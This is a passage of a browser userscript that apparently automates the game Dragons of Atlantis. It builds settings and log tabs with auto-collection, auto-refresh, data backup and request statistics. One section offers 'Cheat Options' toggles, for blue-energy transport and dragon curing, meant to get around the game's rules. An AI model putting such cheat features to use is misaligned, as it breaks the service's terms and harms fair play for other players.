							souls -= def.souls.reaped_souls[p];
							if (souls < 0) souls = 0;
						}
						html += 
							 '	<tr>'
							+'		<td class=left>'
							+'			<span class="' + UID['doa-icons'] + ' i-' + p + '" ></span>'
							+ 			translate(p) 
							+'		</td>'
							+'		<td align=right>'+ parseInt(souls).intToCommas() +'</td>'
							+'		<td align=right>'+ parseInt(reaped).intToCommas() +'</td>'
							+'	</tr>';
					}
				}
				if (mausoleumsFull) {
					html += 
						 '	<tr>'
						+'		<td class=left colspan=3>'
						+ 			translate('mausoleums-full') 
						+'		</td>'
						+'	</tr>';
				}
			}
			html += 
				 '			</table>'
				+'		</td>'
				+'	</tr>'
				+'</table>';
				
			$J( '#'+UID['Tabs.Alliance.tabActivity.ReportDetail'] ).html ( html );
		}
},

}
// *********************************** Alliance features Tab ****************************************

/********************************************************************************
* Options Tab                                                                  *
* - Enable window drag                                                         *
* - Enable collection of resources from Outposts every 1-99 seconds, minutes,  *
*   hours or days                                                              *
* - Verbose logging                                                            *
********************************************************************************/
Tabs.Options = {
	tab_order	: OPTIONS_TAB_ORDER,
	tab_label	: 'Options',
	tab_disabled	: !OPTIONS_TAB_ENABLE,
	
	$container	: null,
	
	section : 0,

	init : function ( div ) 
	{
		var t = Tabs.Options;
		t.$container = $J(div);

		var sel_Unit = ['','',''], sel_auto_refresh = ['','','',''];
		
		switch ( Data.options.auto_collect.unit )
		{
		case 60:    sel_Unit[0] = 'selected';  break;
		case 3600:  sel_Unit[1] = 'selected';  break;
		case 86400: sel_Unit[2] = 'selected';  break;
		default:    sel_Unit[1] = 'selected';
		}

		switch ( parseInt( Data.options.auto_refresh.delay ) )
		{
		case 10: sel_auto_refresh[0] = 'selected'; break
		case 15: sel_auto_refresh[1] = 'selected'; break;
		case 20: sel_auto_refresh[2] = 'selected'; break;
		case 25: sel_auto_refresh[3] = 'selected'; break;
		default: sel_auto_refresh[0] = 'selected';
		}

    
		html = '<div class=' + UID['title'] + '>'+ translate('Options') +'</div>'
		+'<div id=' + setUID('Tabs.Options') + '>'
		+'<h4 style="display:block;width:100%;margin-top:3px;" ref="0" class=' + UID['subtitle'] + '>'+ translate('Game Options') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr valign=top>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.collect') + ' type=checkbox /> ' 
		+ 				translate('Auto-Collection of Resources')
		+'			</label> '
		+'			<input id=' + setUID('Tabs.Options.collect_delay') + ' size=1 maxlength=2 type=text value="' 
		+ 				Data.options.auto_collect.delay + '">'
		+'			</input>'
		+'			<select id=' + setUID('Tabs.Options.collect_unit') + ' size=1>'
		+'				<option value=60 ' + sel_Unit[0] + '>' + translate('Minutes') + '</option>'
		+'				<option value=3600 ' + sel_Unit[1] + '>' + translate('Hours') + '</option>'
		+'				<option value=86400 ' + sel_Unit[2] + '>' + translate('Days') + '</option>'
		+'			</select>'
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.DeleteTransportReports') + ' type=checkbox /> ' 
		+ 				translate('Delete Transport Reports')
		+'			</label> '
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.DeleteTradingReports') + ' type=checkbox /> ' 
		+ 				translate('Delete Trading Reports')
		+'			</label> '
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'
		+'<h4 style="display:block;width:100%;margin-top:3px;" ref="0" class=' + UID['subtitle'] + '>'+ translate('Sound Options') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr valign=top>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.Music') + ' type=checkbox /> ' 
		+ 				translate('Disable Music when game start')
		+'			</label> '
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.jobSound') + ' type=checkbox /> ' 
		+ 				translate('Disable jobs sound')
		+'			</label> '
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.sentinelSound') + ' type=checkbox /> ' 
		+ 				translate('Disable sentinel sound')
		+'			</label> '
		+'		</td>'
		+'	</tr>'
		+'	<tr>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.fortunaSound') + ' type=checkbox /> ' 
		+ 				translate('Disable fortuna sound')
		+'			</label> '
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'
		+'<h4 style="display:block;width:100%;margin-top:3px;" ref="0" class=' + UID['subtitle'] + '>'+ translate('Cheat Options') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr valign=top>'
		+'		<td>'
		+'			<label>'
		+'				<input id=' + setUID('Tabs.Options.BlueEnergy') + ' type=checkbox /> ' 
		+ 				translate('Enable transport of blue energy')
		+'			</label> '
		+'		</td>'
		+'	</tr>';
		if (Data.options.debug_mode) {
			html +=
			 '<tr valign=top>'
			+'	<td>'
			+'		<label>'
			+'			<input id=' + setUID('Tabs.Options.CureDragon') + ' type=checkbox /> ' 
			+ 			translate('Enable Cure Dragon')
			+'		</label> '
			+'	</td>'
			+'</tr>'
		}
		html +=
		//+'	<tr valign=top>'
		//+'		<td>'
		//+'			<label>'
		//+'				<input id=' + setUID('Tabs.Options.OutpostResearch') + ' type=checkbox /> ' 
		//+ 				translate('Enable research on outpost')
		//+'			</label> '
		//+'		</td>'
		//+'	</tr>'
		 '	</table>'
		+'</div>'
		+'<h4  style="display:block;width:100%;margin-top:3px;" ref="1" class=' + UID['subtitle'] + '>'+ translate('Script Options') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr valign=top>'
		+'		<td>'
		+'		<label>'
		+'			<input id=' + setUID('Tabs.Options.auto_refresh') + ' type=checkbox /> ' 
		+ 			translate('Enable') +' '+ translate('Auto Refresh every') 
		+'		</label>'
		+'		<select id=' + setUID('Tabs.Options.auto_refresh_delay') + ' size=1>'
		+'			<option value=10 ' + sel_auto_refresh[0] + '>10</option>'
		+'			<option value=15 ' + sel_auto_refresh[1] + '>15</option>'
		+'			<option value=20 ' + sel_auto_refresh[2] + '>20</option>'
		+'			<option value=25 ' + sel_auto_refresh[3] + '>25</option>'
		+'		</select> ' + translate('Minutes') + ' ' + translate('of inactivity')
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'
		+'<h4 style="display:block;width:100%;margin-top:3px;" ref="2" class=' + UID['subtitle'] + '>'+ translate('Permanent Data') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr>'
		+'		<td>'
		+'		<center>'
		+'		<input id=' + setUID('Tabs.Options.storage.backup')  + ' type=button value="' 
		+ 			translate('Backup') + '">'
		+'		</input>&nbsp;'
		+'		<input id=' + setUID('Tabs.Options.storage.backup_map')  + ' type=button value="' 
		+ 			translate('Backup') + ' ' + translate('Map') +'">'
		+'		</input>&nbsp;'
		+'		<input id=' + setUID('Tabs.Options.storage.restore') + ' type=button value="' 
		+ 			translate('Restore') + '">'
		+'		</input>'
		+'		<br><br>'
		+'		<select id=' + setUID('Tabs.Options.storage.delete_type') + '>'
		+'			<option value="All">' + translate('All') + '</option>'
		+'			<option value="Options">' + translate('Options') + '</option>'
		+'			<option value="Map">' + translate('Map') + '</option>'
		+'		</select> '
		+'		<input id=' + setUID('Tabs.Options.storage.delete')  + ' type=button value="'
		+ 			translate('Delete') + '">'
		+'		</input>'
		+'		<input id=' + setUID('Tabs.Options.storage.file')    + ' type="file" multiple style="opacity:0;position:absolute;z-index:-1"/>'
		+'		</center>'
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'
		+'<h4 style="display:block;width:100%;margin-top:3px;" ref="3" class=' + UID['subtitle'] + '>'+ translate('Server Files') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr>'
		+'		<td>'
		+'		<center>'
		+'		<input id=' + setUID('Tabs.Options.refresh') + ' type=button value="' 
		+			translate('Refresh') + '">'
		+'		</input>'
		+'		</center>'
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'<BR />'
		+'<BR />'
		+'</div>'
		+'<h4 style="display:block;width:100%;margin-top:3px;" ref="3" class=' + UID['subtitle'] + '>'+ translate('Helpful Links') +'</h4>'
		+'<div>'
		+'	<table class=' + UID['table'] + ' width="100%">'
		+'	<tr>'
		+'		<td>'
		+'		<center>'
		+				'<b><h2>Feel free to join the facebook page for support on the script!</h2></b><br>'
		+				'<a href="http://www.facebook.com/groups/DoAscripts//" target="_blank">Our facebook Support Page!</a><br>'
		+				'<br><br><b>  If you would like to help with the development of the script or would like to donate<br>  to keep it going you will find a donate on the home page of <a href"http://wackoscripts.com" target="_blank">Wackoscripts</a><br><br>'
		+				'Thanks For Your Support!!<br></b>'
		+'		</center>'
		+'		</td>'
		+'	</tr>'
		+'	</table>'
		+'</div>'
		+'</div>';
		
		t.$container
		.css({
			height		: '690px'
		})
		.html( html );

		
		t.checkboxChange(UID['Tabs.Options.collect'], Data.options.auto_collect.enabled, AutoCollect.setEnable);
		t.checkboxChange(UID['Tabs.Options.Music'], Data.options.sound.disable_music, onChangeMusic);
		t.checkboxChange(UID['Tabs.Options.jobSound'], Data.options.sound.disable_jobs, onChangeJobsSound );
		t.checkboxChange(UID['Tabs.Options.fortunaSound'], Data.options.sound.disable_fortuna, onChangeFortunaSound);
		t.checkboxChange(UID['Tabs.Options.sentinelSound'], Data.options.sound.disable_sentinel, onChangeSentinelSound);
		t.checkboxChange(UID['Tabs.Options.DeleteTransportReports'], Data.options.delete_reports.transport, onChangeDelTrspRpt);
		t.checkboxChange(UID['Tabs.Options.DeleteTradingReports'], Data.options.delete_reports.trading, onChangeDelTrdRpt);

		$J('#'+UID['Tabs.Options.collect_delay']).change ( onChangeTime );
		$J('#'+UID['Tabs.Options.collect_unit']).change ( onChangeUnit );
		
		t.checkboxChange( UID['Tabs.Options.BlueEnergy'], Data.options.cheat.blue_energy, onChangeBlue);
		//t.checkboxChange( UID['Tabs.Options.OutpostResearch'], Data.options.cheat.outpost_research, onChangeOPResearch);1
		if (Data.options.debug_mode) {
			t.checkboxChange( UID['Tabs.Options.CureDragon'], Data.options.cheat.dragon_healing, onChangeCure);
		}

		t.checkboxChange( UID['Tabs.Options.auto_refresh'], Data.options.auto_refresh.enabled, AutoRefresh.setEnable );
		
		$J('#'+UID['Tabs.Options.auto_refresh_delay']).change ( onChangeRefreshDelay );
		
	

		$J('#'+UID['Tabs.Options.storage.backup']).click ( onClickBackup );
		
		$J('#'+UID['Tabs.Options.storage.backup_map']).click ( onClickBackupMap );
		
		$J('#'+UID['Tabs.Options.storage.file']).change ( onChangeRestoreFile );
		
		$J('#'+UID['Tabs.Options.storage.restore']).click ( function(){
			console.log($id(UID['Tabs.Options.storage.file']));
			$J('#'+UID['Tabs.Options.storage.file']).click();
		});
		
		$J('#'+UID['Tabs.Options.storage.delete']).click ( onClickClearStorage );
		
		
		$J('#'+UID['Tabs.Options.refresh']).click ( onClickRefreshData );

	
		
		function onChangeTime ( event )
		{
			var time = parseIntZero( $J(this).val() );
			if ( Data.options.auto_collect.unit == 60 && time < 10 ) {
				time = 10;
				$J(this).val( time );
			}
			Data.options.auto_collect.delay = time;
		}

		function onChangeMusic ( state )
		{
			Data.options.sound.disable_music = state;
		}

		function onChangeJobsSound ( state )
		{
			Data.options.sound.disable_jobs = state;
		}

		function onChangeFortunaSound ( state )
		{
			Data.options.sound.disable_fortuna = state;
		}

		function onChangeSentinelSound ( state )
		{
			Data.options.sound.disable_sentinel = state;
		}

 		function onChangeDelTrspRpt ( state )
		{
			Data.options.delete_reports.transport = state;
		}

		function onChangeDelTrdRpt ( state )
		{
			Data.options.delete_reports.trading = state;
		}

		function onChangeUnit ( event )
		{
			Data.options.auto_collect.unit = parseIntZero( $J(this).val() );
		}
		
		function onChangeRefreshDelay ( event )
		{
			AutoRefresh.setDelay( $J(this).val() );
		}
		
		function onChangeBlue ( state )
		{
			Data.options.cheat.blue_energy = state;
		}
		
		function onChangeCure ( state )
		{
			Data.options.cheat.dragon_healing = state;
		}

		function onChangeOPResearch ( state )
		{
			Data.options.cheat.outpost_research = state;
		}
		
		function onClickClearStorage () 
		{
			var type = $J('#'+UID['Tabs.Options.storage.delete_type']).val();
			var section = false;
			switch ( type )
			{
			case 'Options':
				section = ['options'];
				break;
			case 'Map':
				section = ['map'];
				break;
			}
			dialogBox({
				id		  : setUID('dialog-confirm'),
				centerTo  : t.$container,
				title	  : translate('Delete') + ' ' + translate(type) + ' ' + translate('Permanent Data'),
				html	  : '<br>' + translate('Are you sure you want to') +' '+ translate('delete') +'<br><b>'+ translate(type) + '</b> ' + translate('Permanent Data') + '?',
				buttons   : [
					{
						text: translate('Confirm'),
						click: function() { 
							Data.clearStorage( section ); 
							$J(this).dialog('destroy');
						}
					},
					{
						text: translate('Cancel'),
						click: function() { $J(this).dialog('destroy'); }
					}
				]
			});

		}
		
		function onClickRefreshData () 
		{
			var t = Tabs.Options;
			var msg = $J.msg({ 
				content 	 : translate('Refresh') + '...',
				target		 : t.$container,
				clickUnblock : false
				
			});
			Seed.fetchPlayer({
				callback  : function() {
				},
				caller    : 'Tabs.Options.refresh'
			});  
		}
		
		function onClickBackup ()
		{
			var t = Tabs.Options;
			var msg = $J.msg({ 
				content 	 : translate('Generating File') + '<br>' + translate('Please, wait') + '...',
				target		 : t.$container,
			});
			setTimeout ( function () {
				var keys = getKeys ( Data.defaults );
				for ( var i=0; i < keys.length; i++ )
				{
					if ( /(marches|requests)/i.test( keys[i] ) ) {
						keys.splice( i , 1 );
					};
				}
				
				var json_data = '{';
				for ( var i = 0; i < keys.length ; i++ )
				{
					var name = keys[i];
					
					try {
						json_data += '"' + name + '":' + JSON.stringify( Data[name] );
					} catch(e){
						console.log(e);
					}
					
					if ( i < keys.length-1 ){
						json_data += ','
					}
				}
				json_data += '}';
				downloadDataURI({
        			filename: "doa_"+Seed.player.name+"_"+serverTime()+".txt", 
        			data: "data:application/text;base64,"+Base64.encode( json_data )
				});
				//window.open('data:application/text;base64,' + Base64.encode( json_data ),'Backup','width=300,height=200,toolbar=0,resizable=0');
			}, 1000);
		}
		
		function onClickBackupMap ()
		{
			var t = Tabs.Options;
			var msg = $J.msg({ 
				content 	 : translate('Generating Map File') + '<br>' + translate('Please, wait') + '...',
				target		 : t.$container,
			});
			setTimeout ( function () {
				var json_data = '{"map":'+ JSON.stringify( Data.map ) + '}';
				downloadDataURI({
				filename: "map_realm"+SERVER_ID+"_"+serverTime()+".txt",
				data: "data:application/text;base64,"+Base64.encode( json_data )
			});
			}, 1000);
		}
		
		function onChangeRestoreFile ()
		{
			var t = Tabs.Options;

			var files = $id(UID['Tabs.Options.storage.file']).files;

			if ( !files.length ) {
			  return;
			}
			
			var reader = new FileReader();
			reader.onload = function( event ) {
				try {
					if ( event.target.result ) {
						Data.mergeWith (  JSON.parse( event.target.result ) );
						var msg = $J.msg({ 
							content 	 : translate('Restore') + ' ' + translate('Successfully'),
							target		 : t.$container,
						});
					}
				} catch (e) {
					var msg = $J.msg({ 
						content 	 : translate('Restore') + ' ' + translate('Error') + '<br><br>' + e ,
						target		 : t.$container,
					});
				}
				// Clear the file container for the next change
				$id(UID['Tabs.Options.storage.file']).files = [];
				$id(UID['Tabs.Options.storage.file']).value = '';
			};
			
			reader.onerror = function( event ) {
				var error = event.target.error.name;
				console.log( error );
				if(error == "NOT_READABLE_ERR") {
				
				}
				// Clear the file container for the next change
				$id(UID['Tabs.Options.storage.file']).files = [];
				$id(UID['Tabs.Options.storage.file']).value = '';
			};
			
			for (var i = 0, file; file = files[i]; i++) {
				// Read file into memory as UTF-8
				reader.readAsText( file, 'UTF-8' );
			}

		}
	}, 

	hide : function () {
	},

	show : function () {
		
	},
	
	checkboxChange : function ( checkboxId, optionVar, callEnable, callIsAvailable )
	{
		var t = Tabs.Options;
		var checkbox = $id( checkboxId );

		if ( callIsAvailable && callIsAvailable() === false )
		{
			checkbox.disabled = true;
			return;
		}
		if ( optionVar ){
			checkbox.checked = true;
		}
		
		$J(checkbox).change ( new eventToggle(checkboxId, optionVar, callEnable).handler );
		
		function eventToggle( checkboxId, optionVar, callOnChange )
		{
			this.handler = handler;
			var optVar   = optionVar;
			var callback = callOnChange;
			
			function handler( event )
			{
				optVar = this.checked;
				if ( callback !== null ) {
					callback( this.checked );
				}
			}
		}
	},
	
	
}


//*********************************** Log Tab ***********************************
Tabs.Logs = {
	tab_order	: LOG_TAB_ORDER,
	tab_label	: 'Logs',
	tab_disabled: !LOG_TAB_ENABLE,
	last_subtab	: 'tabActions',
	
	$container	: null,
	content		: [],
	title		: null,
	max_entries	: 1000,
	stats_timer	: 0, // (by Didi)
	super_timer	: 0, // (by Didi)
	state		: 0,
	
	init : function ( div )
	{
		var t = Tabs.Logs;
		t.$container = $J( div );

		// (Added Debug & Stats by Didi)
		var html = ''
		+'<ul class=tabs>'
		+'	<li class="tab first"><a id=' + setUID('Tabs.Logs.tabActions') + '>' + translate('Actions')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Logs.tabVerbose') + '>' + translate('Verbose')    + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Logs.tabDebug')   + '>' + translate('DebugLog')   + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Logs.tabStats')   + '>' + translate('Statistics') + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Logs.tabSuper')   + '>' + translate('Script Supervision') + '</a></li>'
		+'	<li class=tab><a id='         + setUID('Tabs.Logs.tabDebugger')   + '>' + translate('Debuger') + '</a></li>'
		+'</ul>'
		+'<div id=' + setUID('Tabs.Logs.title') + ' class=' + UID['title'] + '>' + translate('Action Log') + '</div>'
		+'<div style="position:absolute; height:645px; max-height:645px; overflow-y:auto;">'
		+'	<table id=' + setUID('Tabs.Logs.actions') + ' class=' + UID['table_console'] + ' cellspacing=1>'
		+'	<tr>'
		+'		<td class=' + UID['underline'] + '></td>'
		+'		<td class=' + UID['underline'] + ' width=95%></td>'
		+'	<tr>'
		+'	</table>'
		+'</div>'
		+'<div style="position:absolute; height:645px; max-height:645px; overflow-y:auto; display:none;">'
		+'	<table id=' + setUID('Tabs.Logs.verbose') + ' class=' + UID['table_console'] + ' cellspacing=1>'
		+'	<tr>'
		+'		<td class=' + UID['underline'] + '></td>'
		+'		<td class=' + UID['underline'] + ' width=95%></td>'
		+'	<tr>'
		+'	</table>'
		+'</div>'
		+'<div style="position:absolute; height:645px; max-height:645px; overflow-y:auto; display:none;">'
		+'	<table id=' + setUID('Tabs.Logs.debug') + ' class=' + UID['table_console'] + ' cellspacing=1>'
		+'	<tr>'
		+'		<td class=' + UID['underline'] + '></td>'
		+'		<td class=' + UID['underline'] + ' width=95%></td>'
		+'	<tr>'
		+'	</table>'
		+'</div>'
		+'<div style="position:absolute; height:645px; max-height:645px; overflow-y:auto; display:none;">'
		+'	<div id=' + setUID('Tabs.Logs.stats') + '>'
		+'	</div>'
		+'</div>'
		+'<div style="position:absolute; height:700px; max-height:700px; overflow-y:auto; display:none;">'
		+'	<div id=' + setUID('Tabs.Logs.super') + '>'
		+'	</div>'
		+'</div>'
		+'<div style="position:absolute; height:645px; max-height:645px; overflow-y:auto; display:none;">'
		+'	<div id=' + setUID('Tabs.Logs.debugger') + '>'
		+'	</div>'
		+'</div>';
		
		t.$container.html( html );
		
		t.content.push( $id(UID['Tabs.Logs.actions']) );
		$J('#'+UID['Tabs.Logs.tabActions']).click ( t.tabActions );
		
		t.content.push( $id(UID['Tabs.Logs.verbose']) );
		$J('#'+UID['Tabs.Logs.tabVerbose']).click ( t.tabVerbose );
		
		t.content.push( $id(UID['Tabs.Logs.debug']) );
		$J('#'+UID['Tabs.Logs.tabDebug']).click ( t.tabDebug );

		t.content.push( $id(UID['Tabs.Logs.stats']) );
		$J('#'+UID['Tabs.Logs.tabStats']).click ( t.tabStats );
		
		t.content.push( $id(UID['Tabs.Logs.super']) );
		$J('#'+UID['Tabs.Logs.tabSuper']).click ( t.tabSuper );

		t.content.push( $id(UID['Tabs.Logs.debugger']) );
		$J('#'+UID['Tabs.Logs.tabDebugger']).click ( t.tabDebugger );
					
	
		t.title = $id( UID['Tabs.Logs.title'] );
		
		t.state = 1;
		
		for ( var i=0; i < Data.logs.length; i++ )
		{
			var log = Data.logs[i];
			for ( var j=0; j < log.length; j++ )
			{
				t._addRow( log[j].msg, log[j].ts, i );
			}
		}
		
		if ( !Data.requests.start_at ) {
			Data.requests.start_at = serverTime();
		}
		
		if ( DEBUG_MODE === false ) { 
			
			$J('#'+UID['Tabs.Logs.tabVerbose']).hide();
			$J(t.content[1].parentNode).hide();

			// Add debug log (by Didi)
			$J('#'+UID['Tabs.Logs.tabDebug']).hide();
			$J(t.content[2].parentNode).hide();
			
			// Add Stats Requests log (by Didi)
			$J('#'+UID['Tabs.Logs.tabStats']).hide();
			$J(t.content[3].parentNode).hide();

			// Add Supervision script (by Didi)
			$J('#'+UID['Tabs.Logs.tabSuper']).hide();
			$J(t.content[4].parentNode).hide();

			$J('#'+UID['Tabs.Logs.tabDebugger']).hide();
			$J(t.content[5].parentNode).hide();
		}

		t.tabActions();
		
	},
	
	tabDebugToggle : function()
	{
		var t = Tabs.Logs;
	
		$J('#'+UID['Tabs.Logs.tabVerbose']).toggle();
		$J(t.content[1].parentNode).toggle();
		$J('#'+UID['Tabs.Logs.tabDebug']).toggle();
		$J(t.content[2].parentNode).toggle();
		$J('#'+UID['Tabs.Logs.tabStats']).toggle();
		$J(t.content[3].parentNode).toggle();
		$J('#'+UID['Tabs.Logs.tabSuper']).toggle();
		$J(t.content[4].parentNode).toggle();
		$J('#'+UID['Tabs.Logs.tabDebugger']).toggle();
		$J(t.content[5].parentNode).toggle();
	},

	tabActions : function ()
	{
		var t = Tabs.Logs;

		$J('#'+UID[t.last_subtab])
		.css('z-index','0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Logs.tabActions'])
		.css('z-index','1')
		.addClass('selected');
		
		t.last_subtab = 'Tabs.Logs.tabActions';

		$J(t.content[0]).parent().show();
		$J(t.content[1]).parent().hide();
		$J(t.content[2]).parent().hide();
		$J(t.content[3]).parent().hide();
		$J(t.content[4]).parent().hide();
		$J(t.content[5]).parent().hide();
		
		clearTimeout(t.stats_timer); t.stats_timer=null;
		clearTimeout(t.super_timer); t.super_timer=null;
		
		t.title.innerHTML = translate('Action Log');

	},

	tabVerbose : function ()
	{
		var t = Tabs.Logs;
		
		$J('#'+UID[t.last_subtab])
		.css('z-index','0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Logs.tabVerbose'])
		.css('z-index','1')
		.addClass('selected');

		t.last_subtab = 'Tabs.Logs.tabVerbose';
		
		$J(t.content[0]).parent().hide();
		$J(t.content[1]).parent().show();
		$J(t.content[2]).parent().hide();
		$J(t.content[3]).parent().hide();
		$J(t.content[4]).parent().hide();
		$J(t.content[5]).parent().hide();
		
		clearTimeout(t.stats_timer); t.stats_timer=null;
		clearTimeout(t.super_timer); t.super_timer=null;
		
		t.title.innerHTML = translate('Verbose Log');
	},
	
	// Debug log (by Didi)
	tabDebug : function (){
		var t = Tabs.Logs;
		
		$J('#'+UID[t.last_subtab])
		.css('z-index','0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Logs.tabDebug'])
		.css('z-index','1')
		.addClass('selected');
		
		t.last_subtab = 'Tabs.Logs.tabDebug';

		$J(t.content[0]).parent().hide();
		$J(t.content[1]).parent().hide();
		$J(t.content[2]).parent().show();
		$J(t.content[3]).parent().hide();
		$J(t.content[4]).parent().hide();
		$J(t.content[5]).parent().hide();
	
		clearTimeout(t.stats_timer); t.stats_timer=null;
		clearTimeout(t.super_timer); t.super_timer=null;
	
		t.title.innerHTML = translate('Debug');
	},

	//didi moif : add stats of request
	tabStats : function (){
		var t = Tabs.Logs;
		var html = '';
				
		$J('#'+UID[t.last_subtab])
		.css('z-index','0')
		.removeClass('selected');
		
		$J('#'+UID['Tabs.Logs.tabStats'])
		.css('z-index','1')
		.addClass('selected');
		
		t.last_subtab = 'Tabs.Logs.tabStats';
		
		$J(t.content[0]).parent().hide();
		$J(t.content[1]).parent().hide();
		$J(t.content[2]).parent().hide();
		$J(t.content[3]).parent().show();
		$J(t.content[4]).parent().hide();
		$J(t.content[5]).parent().hide();

		
		clearTimeout(t.stats_timer); t.stats_timer=null;
		clearTimeout(t.super_timer); t.super_timer=null;
		
		t.title.innerHTML = translate('Statistics');
		
		var total_requests = 0;
		var total_errors = 0;
		
		// Make the Totals
		for ( var type in Data.requests ){
			if ( Data.requests.hasOwnProperty( type ) && typeof Data.requests[type].total !== 'undefined') {
					total_requests += Data.requests[type].total;
					total_errors   += Data.requests[type].errors;
			}
		}

		Data.requests.run_time = serverTime() - Data.requests.start_at;
		var run_time = (Data.requests.run_time > 0) ? (Data.requests.run_time/3600) : 1;

		html += '<TABLE class="' + UID['table'] + ' ' + UID['table_console'] + '" border=1 cellspacing=1 width=97%>'
			 + '<TR>'
			 + '	<TH width=35%>'+translate('Request')+ '</TH>'
			 + '	<TH>'+translate('Total') +'</TH>'
			 + '	<TH>'+translate('Rate') +'</TH>'
			 + '	<TH>'+translate('Errors') +'</TH>'
			 + '</TR>';
			 
		
		
		// Manifest
		var perHour = Data.requests.manifest.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Manifest')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.manifest.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.manifest.errors + '</TD>'
			 + '</TR>';

		// Player
		var perHour = Data.requests.player.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Player')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.player.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.player.errors + '</TD>'
			 + '</TR>';

		// Cities
		var perHour = Data.requests.cities.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('City')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.cities.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.cities.errors + '</TD>'
			 + '</TR>';
			 
		// Generals
		var perHour = Data.requests.generals.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Generals')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.generals.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.generals.errors + '</TD>'
			 + '</TR>';
		
		// Separator
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';
			 
		// Map
		var perHour = Data.requests.map.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Map')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.map.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.map.errors + '</TD>'
			 + '</TR>';

		// Separator
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';

		// Marches
		var perHour = Data.requests.marches.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Marches')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.marches.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.marches.errors + '</TD>'
			 + '</TR>';

		// Recalls
		var perHour = Data.requests.recalls.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>' + translate('Recall') + ' : </TD>'
			 + '	<TD align=right>'+Data.requests.recalls.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.recalls.errors + '</TD>'
			 + '</TR>';
			 
		// Abandon Wilderness
		var perHour = Data.requests.abandon.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Wilderness') + ' ' + translate('Leave')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.abandon.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.abandon.errors + '</TD>'
			 + '</TR>';
		
		// Separator
		html += '<TR>'
			 + '	<TD colspan=4>&nbsp;</TD>'
			 + '</TR>';
			 
		// Reports
		var perHour = Data.requests.reports.total / run_time;
		html += '<TR>'
			 + '	<TD align=right>'+translate('Reports')+' : </TD>'
			 + '	<TD align=right>'+Data.requests.reports.total + '</TD>'
			 + '	<TD align=right>'+perHour.intToCommas() + '/'+ translate('h')+ '</TD>'
			 + '	<TD align=right class=' + UID['bold_red'] + '>'+Data.requests.reports.errors + '</TD>'
			 + '</TR>';
			 
		// Reports Read
		var perHour = Data.requests.reports_read.total / run_time;
		html += '<TR>'
